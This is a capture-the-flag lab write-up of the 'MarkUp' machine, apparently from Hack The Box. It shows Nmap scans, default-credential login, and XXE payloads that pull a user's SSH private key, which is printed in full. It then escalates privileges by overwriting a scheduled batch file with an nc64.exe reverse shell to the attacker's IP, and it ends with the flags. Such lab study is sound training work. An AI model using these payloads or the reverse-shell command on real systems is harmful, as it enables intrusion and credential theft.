# MarkUp

|     Local    |     Remote     |
| ------------ | -------------- |
| 10.10.15.155 | 10.129.201.205 |
| 10.10.15.155 | 10.129.95.192  |

----

## Nmap
```
nmap 10.129.201.205        
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-21 20:07 EDT
Nmap scan report for 10.129.201.205
Host is up (0.043s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https

Nmap done: 1 IP address (1 host up) scanned in 4.66 seconds
```

```
# nmap -Pn -sS -sV -sC -O -p 22,80,443 10.129.201.205
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-21 20:10 EDT
Nmap scan report for 10.129.201.205
Host is up (0.042s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH for_Windows_8.1 (protocol 2.0)
| ssh-hostkey: 
|   3072 9f:a0:f7:8c:c6:e2:a4:bd:71:87:68:82:3e:5d:b7:9f (RSA)
|   256 90:7d:96:a9:6e:9e:4d:40:94:e7:bb:55:eb:b3:0b:97 (ECDSA)
|_  256 f9:10:eb:76:d4:6d:4f:3e:17:f3:93:d6:0b:8c:4b:81 (ED25519)
80/tcp  open  http     Apache httpd 2.4.41 ((Win64) OpenSSL/1.1.1c PHP/7.2.28)
|_http-server-header: Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.2.28
|_http-title: MegaShopping
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
443/tcp open  ssl/http Apache httpd 2.4.41 ((Win64) OpenSSL/1.1.1c PHP/7.2.28)
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_http-server-header: Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.2.28
|_http-title: MegaShopping
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_ssl-date: TLS randomness does not represent time
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019 (88%)
Aggressive OS guesses: Microsoft Windows Server 2019 (88%)
No exact OS matches for host (test conditions non-ideal).

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.83 seconds
```

## Guessed the login creds
1. Searched Google for "default login credentials" and started trying the pairs.
2. Works: admin/password

## Poke around the site...

Check out the pages. Check out each page's source code. Anything to ***enumerate***? 
- The "Orders" page, when "View Source" is used, shows "Daniel" modified this page.
```
<!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>Goods & Services</title>
        <!-- Modified by Daniel : UI-Fix-9092-->
        <style>
...
```

## XML
The "Order" page uses XML to tranfer form data to the server.
- Use BurpSuite to capture the posting of the form data:
```
POST /process.php HTTP/1.1
Host: 10.129.95.192
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: text/xml
Content-Length: 141
Origin: http://10.129.95.192
Connection: keep-alive
Referer: http://10.129.95.192/services.php
Cookie: PHPSESSID=hmh2uk62nc3m8gmg5knr3n7g3j

<?xml version = "1.0"?>
  <order>
    <quantity>2</quantity>
    <item>Home Appliances</item>
    <address>This is from the address form box.</address>
  </order>
```

We are interested in the bottom portion: `<?xml version = "1.0"?>`

## Google Search

Searched on "xml website vulnerabilities". The first result had this:
- XML External Entity (XXE or XEE) vulnerabilities are a type of security vulnerability that allow attackers to exploit the XML parser functionality in web applications.
- These vulnerabilities occur when an application accepts XML input from untrusted sources without proper validation and processing.

The second result was from the [OWASP site](https://cheatsheetseries.owasp.org/cheatsheets/XML_Security_Cheat_Sheet.html).

## Exploiting XXE/XEE

Google Search on "exploiting xxe". The first result was from PortSwigger (makers of BurpSuite).
- XML external entity injection (also known as XXE) is a web security vulnerability that allows an attacker to interfere with an application's processing of XML data.
- It often allows an attacker to view files on the application server filesystem, and to interact with any back-end or external systems that the application itself can access.
- In some situations, an attacker can escalate an XXE attack to compromise the underlying server or other back-end infrastructure, by leveraging the XXE vulnerability to perform server-side request forgery (SSRF) attacks. 

### [Exploiting XXE to retrieve files](https://portswigger.net/web-security/xxe#exploiting-xxe-to-retrieve-files)

To perform an XXE injection attack that retrieves an arbitrary file from the server's filesystem, you need to modify the submitted XML in two ways:
1. Introduce (or edit) a `DOCTYPE` element that defines an external entity containing the path to the file.
2. Edit a data value in the XML that is returned in the application's response, to make use of the defined external entity.

Using our XML data from above: 
```
<?xml version = "1.0"?>
  <order>
    <quantity>2</quantity>
    <item>Home Appliances</item>
    <address>This is from the address form box.</address>
  </order>
```

If the application performs no particular defenses against XXE attacks, we can exploit the XXE vulnerability and retrieve the `/etc/passwd` file (if Linux) or a similarly common file (if Windows):
- The XXE payload defines an external entity `&xxe;` whose value is the contents of the `/etc/passwd` file and uses the entity within the `quantity` value. This causes the application's response to include the contents of the file:
- Use BurpSuite's Repeater to send this code to the server:
```
<?xml version = "1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///C:\Windows\win.ini"> ]>
<order>
  <quantity>&xxe;</quantity>
  <item>Home Appliances</item>
  <address>This is from the address form box.</address>
</order>
```

Didn't work. Tweaked it to this: 
```
<?xml version = "1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini"> ]>
<order>
  <quantity>&xxe;</quantity>
  <item>Home Appliances</item>
  <address>This is from the address form box.</address>
</order>
```

Didn't work. 

Googled: "xxe test windows machine"
- [Found this](https://medium.com/@canavaroxum/xxe-on-windows-system-then-what-76d571d66745). He used the following code with a netcat listener waiting on the attack machine:
```
<?xml version = "1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY> 
  <!ENTITY xxe SYSTEM "http://10.10.15.155:1234">]>
<foo>&xxe;</foo>
```
That resulted in this on my listener (showing the server is vulnerable to XXE): 
```
# nc -nvlp 1234
listening on [any] 1234 ...
connect to [10.10.15.155] from (UNKNOWN) [10.129.95.192] 49695
GET / HTTP/1.0
Host: 10.10.15.155:1234
Connection: close
```

[Note from the original site](https://portswigger.net/web-security/xxe#exploiting-xxe-to-retrieve-files): 
- With real-world XXE vulnerabilities, there will often be a large number of data values within the submitted XML, any one of which might be used within the application's response. To test systematically for XXE vulnerabilities, you will generally need to test each data node in the XML individually, by making use of your defined entity and seeing whether it appears within the response.

### Walk-Through: Correct Placement of the Variable!

The walk-through for this machine has this: 
```
<?xml version = "1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE root [ <!ENTITY test SYSTEM 'file:///c:/windows/win.ini'> ]>
<order>
  <quantity>3</quantity>
  <item>&test;</item>
  <address>17th Estate, CA</address>
</order>
```

Note the placement: within the `item`tags.
- Putting the varible `test` in any other tag set does not work. 
- Response in Burp:
```
HTTP/1.1 200 OK
Date: Fri, 23 Aug 2024 22:51:54 GMT
Server: Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.2.28
X-Powered-By: PHP/7.2.28
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 146
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

Your order for 
; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1
[Ports]
COM1:=9600,n,8,1
has been processed
```

### NOTE THE RESPONSE: This is why no other tag set will work... 
- You need to **pay attention** to the ***original response***. The response from the server includes the "Type of Goods" you chose on the form. 
- Example: If you chose "Electronics" on the form, the reply would say "Your order for ***Electronics*** has been processed"
- Neither of the other two fields is returned from the server in the response. Therefore you need to place your variable in the tag set that the server will send back to you.
- When it sends back its response, it will include your XML request (for the win.ini file).

## SSH Key

In the original nmap enumeration, we saw ssh was open: 
```
PORT    STATE SERVICE
22/tcp  open  ssh
```

By viewing the source code for the web pages we saw "Daniel" modified the Orders page. 
- If Daniel is a user authorized to modify the site's pages, he may have access to the server via ssh (to make those changes).
- We need to know his username, so start with "daniel" and check out his ssh_rsa subdir...

Google Search: "where is a user's ssh key stored in windows"
- First answer: "By default, the system will save the keys to your home directory `/.ssh/id_rsa`."

### Try to retrieve that file via the XXE vulnerability: 
In Burp's Repeater... 
```
<?xml version = "1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE root [ <!ENTITY test SYSTEM 'file:///c:/users/daniel/.ssh/id_rsa'> ]>
<order>
  <quantity>3</quantity>
  <item>&test;</item>
  <address>17th Estate, CA</address>
</order>
```

Response: 
```
HTTP/1.1 200 OK
Date: Fri, 23 Aug 2024 23:08:17 GMT
Server: Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.2.28
X-Powered-By: PHP/7.2.28
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 2636
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

Your order for -----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
 has been processed
```

## Use that SSH to login as Daniel

Google Search: "OPENSSH PRIVATE KEY format"
- [The OpenSSH Private Key Format ](https://coolaj86.com/articles/the-openssh-private-key-format/): You should just be able to copy and paste this into a file on our attack machine...
```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEArJgaPRF5S49ZB+Ql8cOhnURSOZ4nVYRSnPXo6FIe9JnhVRrdEiMi
QZoKVCX6hIWp7I0BzN3o094nWInXYqh2oz5ijBqrn+NVlDYgGOtzQWLhW7MKsAvMpqM0fg
HYC5nup5qM8LYDyhLQ56j8jq5mhvEspgcDdGRy31pljOQSYDeAKVfiTOOMznyOdY/Klt6+
ca+7/6ze8LTD3KYcUAqAxDINaZnNrG66yJU1RygXBwKRMEKZrEviLB7dzLElu3kGtiBa0g
DUqF/SVkE/tKGDH+XrKl6ltAUKfald/nqJrZbjDieplguocXwbFugIkyCc+eqSyaShMVk3
PKmZCo3ddxfmaXsPTOUpohi4tidnGO00H0f7Vt4v843xTWC8wsk2ddVZZV41+ES99JMlFx
LoVSXtizaXYX6l8P+FuE4ynam2cRCqWuislM0XVLEA+mGznsXeP1lNL+0eaT3Yt/TpfkPH
3cUU0VezCezxqDV6rs/o333JDf0klkIRmsQTVMCVAAAFiGFRDhJhUQ4SAAAAB3NzaC1yc2
EAAAGBAKyYGj0ReUuPWQfkJfHDoZ1EUjmeJ1WEUpz16OhSHvSZ4VUa3RIjIkGaClQl+oSF
qeyNAczd6NPeJ1iJ12KodqM+Yowaq5/jVZQ2IBjrc0Fi4VuzCrALzKajNH4B2AuZ7qeajP
C2A8oS0Oeo/I6uZobxLKYHA3Rkct9aZYzkEmA3gClX4kzjjM58jnWPypbevnGvu/+s3vC0
w9ymHFAKgMQyDWmZzaxuusiVNUcoFwcCkTBCmaxL4iwe3cyxJbt5BrYgWtIA1Khf0lZBP7
Shgx/l6ypepbQFCn2pXf56ia2W4w4nqZYLqHF8GxboCJMgnPnqksmkoTFZNzypmQqN3XcX
5ml7D0zlKaIYuLYnZxjtNB9H+1beL/ON8U1gvMLJNnXVWWVeNfhEvfSTJRcS6FUl7Ys2l2
F+pfD/hbhOMp2ptnEQqlrorJTNF1SxAPphs57F3j9ZTS/tHmk92Lf06X5Dx93FFNFXswns
8ag1eq7P6N99yQ39JJZCEZrEE1TAlQAAAAMBAAEAAAGAJvPhIB08eeAtYMmOAsV7SSotQJ
HAIN3PY1tgqGY4VE4SfAmnETvatGGWqS01IAmmsxuT52/B52dBDAt4D+0jcW5YAXTXfStq
mhupHNau2Xf+kpqS8+6FzqoQ48t4vg2Mvkj0PDNoIYgjm9UYwv77ZsMxp3r3vaIaBuy49J
ZYy1xbUXljOqU0lzmnUUMVnv1AkBnwXSDf5AV4GulmhG4KZ71AJ7AtqhgHkdOTBa83mz5q
FDFDy44IyppgxpzIfkou6aIZA/rC7OeJ1Z9ElufWLvevywJeGkpOBkq+DFigFwd2GfF7kD
1NCEgH/KFW4lVtOGTaY0V2otR3evYZnP+UqRxPE62n2e9UqjEOTvKiVIXSqwSExMBHeCKF
+A5JZn45+sb1AUmvdJ7ZhGHhHSjDG0iZuoU66rZ9OcdOmzQxB67Em6xsl+aJp3v8HIvpEC
sfm80NKUo8dODlkkOslY4GFyxlL5CVtE89+wJUDGI0wRjB1c64R8eu3g3Zqqf7ocYVAAAA
wHnnDAKd85CgPWAUEVXyUGDE6mTyexJubnoQhqIzgTwylLZW8mo1p3XZVna6ehic01dK/o
1xTBIUB6VT00BphkmFZCfJptsHgz5AQXkZMybwFATtFSyLTVG2ZGMWvlI3jKwe9IAWTUTS
IpXkVf2ozXdLxjJEsdTno8hz/YuocEYU2nAgzhtQ+KT95EYVcRk8h7N1keIwwC6tUVlpt+
yrHXm3JYU25HdSv0TdupvhgzBxYOcpjqY2GA3i27KnpkIeRQAAAMEA2nxxhoLzyrQQBtES
h8I1FLfs0DPlznCDfLrxTkmwXbZmHs5L8pP44Ln8v0AfPEcaqhXBt9/9QU/hs4kHh5tLzR
Fl4Baus1XHI3RmLjhUCOPXabJv5gXmAPmsEQ0kBLshuIS59X67XSBgUvfF5KVpBk7BCbzL
mQcmPrnq/LNXVk8aMUaq2RhaCUWVRlAoxespK4pZ4ffMDmUe2RKIVmNJV++vlhC96yTuUQ
S/58hZP3xlNRwlfKOw1LPzjxqhY+vzAAAAwQDKOnpm/2lpwJ6VjOderUQy67ECQf339Dvy
U9wdThMBRcVpwdgl6z7UXI00cja1/EDon52/4yxImUuThOjCL9yloTamWkuGqCRQ4oSeqP
kUtQAh7YqWil1/jTCT0CujQGvZhxyRfXgbwE6NWZOEkqKh5+SbYuPk08kB9xboWWCEOqNE
vRCD2pONhqZOjinGfGUMml1UaJZzxZs6F9hmOz+WAek89dPdD4rBCU2fS3J7bs9Xx2PdyA
m3MVFR4sN7a1cAAAANZGFuaWVsQEVudGl0eQECAwQFBg==
-----END OPENSSH PRIVATE KEY-----
```

To use an existing private key inline with SSH you need to select the `identity` file path with the parameter `-i` as follows:
```
ssh -i '/path/to/keyfile' username@server
```

So I did: 
- **Note:** I had to `chmod 600 ssh_key_daniel` because ssh would not allow the use of the private key if the key file was readable by others.
- I think proper perms for an ssh private key would be `400` but `600` worked.
```
# chmod 600 ssh_key_daniel
# ssh -i ssh_key_daniel daniel@10.129.95.192

Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

daniel@MARKUP C:\Users\daniel>
```

## User Flag

```
daniel@MARKUP C:\Users\daniel>dir 
 Volume in drive C has no label.                   
 Volume Serial Number is BA76-B4E3                 
                                                   
 Directory of C:\Users\daniel                      
                                                   
10/13/2021  04:43 PM    <DIR>          .           
10/13/2021  04:43 PM    <DIR>          ..          
03/05/2020  06:19 AM    <DIR>          .ssh        
03/05/2020  07:18 AM    <DIR>          Desktop     
04/21/2020  03:34 AM    <DIR>          Documents   
09/15/2018  12:12 AM    <DIR>          Downloads   
09/15/2018  12:12 AM    <DIR>          Favorites   
09/15/2018  12:12 AM    <DIR>          Links       
09/15/2018  12:12 AM    <DIR>          Music       
09/15/2018  12:12 AM    <DIR>          Pictures    
09/15/2018  12:12 AM    <DIR>          Saved Games 
09/15/2018  12:12 AM    <DIR>          Videos      
               0 File(s)              0 bytes      
              12 Dir(s)   7,387,570,176 bytes free 
                                                   
daniel@MARKUP C:\Users\daniel>cd Desktop 
                                                           
daniel@MARKUP C:\Users\daniel\Desktop>dir                  
 Volume in drive C has no label.                   
 Volume Serial Number is BA76-B4E3                 
                                                   
 Directory of C:\Users\daniel\Desktop              
                                                   
03/05/2020  07:18 AM    <DIR>          .           
03/05/2020  07:18 AM    <DIR>          ..          
03/05/2020  07:18 AM                35 user.txt    
               1 File(s)             35 bytes      
               2 Dir(s)   7,387,643,904 bytes free 
                                                   
daniel@MARKUP C:\Users\daniel\Desktop>type user.txt 
032d2fc8952a8c24e39c8f0ee9918ef7       
                                       
daniel@MARKUP C:\Users\daniel\Desktop>
```

## QUESTION, Task #7
- What is the file located in the Log-Management folder on the target.
- The "Log-Management" folder is the name of the directory (not /var/www/html or something like that)

```
daniel@MARKUP C:\Users\daniel\Desktop>cd C:\

daniel@MARKUP C:\>dir
 Volume in drive C has no label.
 Volume Serial Number is BA76-B4E3

 Directory of C:\

03/12/2020  03:56 AM    <DIR>          Log-Management
09/15/2018  12:12 AM    <DIR>          PerfLogs
07/28/2021  02:01 AM    <DIR>          Program Files
09/15/2018  12:21 AM    <DIR>          Program Files (x86)
07/28/2021  03:38 AM                 0 Recovery.txt
03/05/2020  05:40 AM    <DIR>          Users
07/28/2021  02:16 AM    <DIR>          Windows
03/05/2020  10:15 AM    <DIR>          xampp
               1 File(s)              0 bytes
               7 Dir(s)   7,386,595,328 bytes free

daniel@MARKUP C:\>cd Log-Management

daniel@MARKUP C:\Log-Management>dir 
 Volume in drive C has no label.               
 Volume Serial Number is BA76-B4E3             
                                               
 Directory of C:\Log-Management                
                                               
03/12/2020  03:56 AM    <DIR>          .       
03/12/2020  03:56 AM    <DIR>          ..      
03/06/2020  02:42 AM               346 job.bat 
               1 File(s)            346 bytes  
               2 Dir(s)   7,387,643,904 bytes free

```

## QUESTION, Task #8
- What executable is mentioned in the file mentioned before?
```
daniel@MARKUP C:\Log-Management>type job.bat 
@echo off 
FOR /F "tokens=1,2*" %%V IN ('bcdedit') DO SET adminTest=%%V
IF (%adminTest%)==(Access) goto noAdmin
for /F "tokens=*" %%G in ('wevtutil.exe el') DO (call :do_clear "%%G")
echo.
echo Event Logs have been cleared!
goto theEnd
:do_clear
wevtutil.exe cl %1
goto :eof
:noAdmin
echo You must run this script as an Administrator!
:theEnd
exit
```

## Priv Esc
[Check your current privileges](../../07_Post-Exploitation/4_Privilege_Escalation/win_00_check_privs.md):

**1. whoami**
```
daniel@MARKUP c:\Log-Management>whoami
markup\daniel
```

**2. net user:** list out all the users on the system
```
daniel@MARKUP c:\Log-Management>net user

User accounts for \\

-------------------------------------------------------------------------------
Administrator            daniel                   DefaultAccount
Guest                    WDAGUtilityAccount
The command completed with one or more errors.
```

**3. whoami /priv:** you should see all the privs associated with the current user
```
daniel@MARKUP c:\Log-Management>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

**Conclusion:** The user Daniel sucks. We want to be Administrator.

## Exploiting job.bat & wevtutil

**Walk-Through:** Since the file itself (job.bat) can only be run by an Administrator, we could try our luck and see if our usergroup could at least edit the file, instead of running it, or if there are any mismatched permissions between the script and the usergroup or file configuration. 
We can achieve this by using the `icacls` command.

[icacls](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/icacls): 
- Displays or modifies discretionary access control lists (DACLs) on specified files, and applies stored DACLs to files in specified directories.
- Sytax:
```
icacls <filename> [/grant[:r] <sid>:<perm>[...]] [/deny <sid>:<perm>[...]] [/remove[:g|:d]] <sid>[...]] [/t] [/c] [/l] [/q] [/setintegritylevel <Level>:<policy>[...]]
icacls <directory> [/substitute <sidold> <sidnew> [...]] [/restore <aclfile> [/c] [/l] [/q]]
```

Run: `icacls job.bat`
```
daniel@MARKUP c:\Log-Management>icacls job.bat
job.bat BUILTIN\Users:(F)
        NT AUTHORITY\SYSTEM:(I)(F)
        BUILTIN\Administrators:(I)(F)
        BUILTIN\Users:(I)(RX)

Successfully processed 1 files; Failed processing 0 files
```

**Results:** the group `BUILTIN\Users` has full control `(F)` over the file.
- The `BUILTIN\Users` group represents all local users, which includes Daniel as well.

**Check Scheduled Tasks:** Before then, we need to check if the wevtutil process mentioned in the job.bat file is running.
- We can see the currently scheduled tasks by typing the `schtasks` command.
- Nada. Did not give me anything (perm issue)

**Next try:** `ps` in Powershell
- Type 'powershell" at the cmd line then 'ps' once you're in PowerShell.
- You might have to run `ps` several times to see if `wevtutil` runs. It does. So job.bat is likely scheduled as a task.

### Need `nc64.exe` on the target
- Downloaded the file from [here](https://github.com/rahuldottech/netcat-for-windows/releases). 
- Copied the file to the target with `scp`:
```
scp -i ssh_key_daniel nc64.exe daniel@10.129.95.192:/Users/daniel
```

Modified the job.bat file on the target with: 
- This replaces (`>`) the entire contents of the job.bat file with the cmd command.
```
daniel@MARKUP c:\Log-Management>echo C:\Users\daniel\nc64.exe -e cmd.exe 10.10.15.155 1234 > job.bat
```
- Observe the syntax for the `nc64.exe` file: `nc64.exe -e cmd.exe {your_IP} {port}`
- This executes the file named cmd.exe and sends it to the hostname 10.10.15.155 via port 1234.
- From the `nc` man page, Synopsis:
```
nc [-options] hostname port[s] 
```

### Results: 
- From the listener on the attack machine (reverse cmd shell from the job.bat hack):
```
# nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.10.15.155] from (UNKNOWN) [10.129.95.192] 49723
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
markup\administrator

C:\Windows\system32>cd /Users/Administrator
cd /Users/Administrator

C:\Users\Administrator>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is BA76-B4E3

 Directory of C:\Users\Administrator

10/13/2021  04:43 PM    <DIR>          .
10/13/2021  04:43 PM    <DIR>          ..
03/05/2020  05:11 AM    <DIR>          3D Objects
03/05/2020  05:11 AM    <DIR>          Contacts
03/05/2020  07:33 AM    <DIR>          Desktop
04/21/2020  04:16 AM    <DIR>          Documents
03/05/2020  05:11 AM    <DIR>          Downloads
03/05/2020  05:11 AM    <DIR>          Favorites
03/05/2020  05:11 AM    <DIR>          Links
03/05/2020  05:11 AM    <DIR>          Music
03/05/2020  05:11 AM    <DIR>          Pictures
03/05/2020  05:11 AM    <DIR>          Saved Games
03/05/2020  05:11 AM    <DIR>          Searches
03/05/2020  05:11 AM    <DIR>          Videos
               0 File(s)              0 bytes
              14 Dir(s)   7,394,545,664 bytes free

C:\Users\Administrator>cd Desktop
cd Desktop

C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is BA76-B4E3

 Directory of C:\Users\Administrator\Desktop

03/05/2020  07:33 AM    <DIR>          .
03/05/2020  07:33 AM    <DIR>          ..
03/05/2020  07:33 AM                70 root.txt
               1 File(s)             70 bytes
               2 Dir(s)   7,394,545,664 bytes free

C:\Users\Administrator\Desktop>type root.txt
type root.txt
f574a3e7650cebd8c39784299cb570f8
```

## Done

![image](https://github.com/user-attachments/assets/35d63f86-46ab-4c3f-a2b0-b0f7725ca043)


